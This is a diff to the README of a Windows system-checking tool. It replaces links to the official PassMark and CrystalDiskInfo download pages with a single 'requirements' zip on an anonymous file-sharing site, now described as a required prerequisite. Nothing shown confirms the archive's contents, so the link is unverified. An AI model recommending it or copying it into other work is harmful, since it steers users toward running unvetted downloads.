@@ -119,12 +119,11 @@ dist\SystemChecker\
 
 ## 🔧 Third-Party Tools / ابزارهای جانبی
 
-این برنامه از ابزارهای زیر پشتیبانی می‌کند (باید جداگانه دانلود شوند):
+پیش نیاز های برنامه که برای تست هارد و بقیه موارد نیاز هستند:
 
 | ابزار | لینک دانلود |
 |---|---|
-| **Passmark PerformanceTest** | [passmark.com](https://www.passmark.com/products/performancetest/) |
-| **CrystalDiskInfo Portable** | [crystalmark.info](https://crystalmark.info/en/software/crystaldiskinfo/) |
+| **requirements** | [requirements](https://s34.picofile.com/file/8490375976/requirements.zip.html) |
 
 ---
 
